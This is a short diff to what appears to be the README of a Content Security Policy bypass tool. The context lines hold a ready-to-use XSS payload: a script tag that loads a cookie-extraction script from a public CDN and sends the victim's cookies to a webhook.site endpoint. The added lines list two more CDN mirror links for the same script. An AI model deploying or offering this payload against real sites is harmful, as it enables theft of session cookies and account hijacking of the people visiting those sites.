@@ -12,3 +12,7 @@ Example extracting cookies:
 ```html
 <script src="https://cdn.jsdelivr.net/gh/gramthanos/csp-x55@766f06154617964de53410b6aa7ff02459b4925e/extract-c00kies.js" r="https://webhook.site/youridhere"></script>
 ```
+
+Example CDN links:
+https://cdn.jsdelivr.net/gh/gramthanos/csp-x55@766f06154617964de53410b6aa7ff02459b4925e/extract-c00kies.js
+https://cdn.statically.io/gh/GramThanos/csp-x55/766f06154617964de53410b6aa7ff02459b4925e/extract-c00kies.js
